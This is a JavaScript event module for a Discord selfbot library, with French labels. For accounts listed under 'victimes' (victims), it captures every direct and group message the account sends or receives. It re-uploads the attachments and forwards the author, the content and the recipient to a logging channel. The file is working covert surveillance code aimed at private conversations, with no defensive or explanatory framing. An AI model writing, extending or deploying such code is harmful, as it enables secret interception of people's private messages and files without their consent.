const { Message, Client } = require('legend.js');

module.exports = {
    name: "message",
    once: false,
    /**
     * @param {Message} message
     * @param {Client} client
    */
    run: async (message, client) => {
        if (Object.keys(client.config.victimes).length === 0) return;
        if (!config.victimes[client.user.id] || ![ "dm", "group" ].includes(message.channel.type)) return;

        const attachments = [];

        const embed = {
            author: { name: message.author.username, icon_url: message.author.avatarURL },
            color: 0xFFFFFF,
            title: `<:crown:1263199019446833213>・Logs ${client.user.global_name || client.user.username}・<:crown:1263199019446833213>`,
            fields: [
                { name: 'Auteur :', value: `${message.author} (${message.author.id})` },
                { name: 'Message :', value: message.content ?? 'Aucun message' },
            ],
            timestamp: new Date().toISOString(),
            footer: { text: client.user.global_name ?? client.user.username, icon_url: client.user.avatarURL }
        }

        if (message.channel.type == 'dm') embed.fields.push({ name: 'Récépteur :', value: message.author.id === client.user.id ? `${message.channel.recipient.username} (${message.channel.recipient.id})` : `${client.user.username} (${client.user.id})` });

        for (const a of message.attachments.map(r => r)){
            await client.upload(a.url)
                .then(i => attachments.push(i))
                .catch(() => attachments.push(a.url));
        }

        if (attachments.length) embed.fields.push({ name: 'Fichiers', value: attachments.map((r, i) => `- [Fichier ${i+1}](${r})`).join('\n') })
        client.log(client.config.victimes[client.user.id], { embeds: [embed] })
    }
}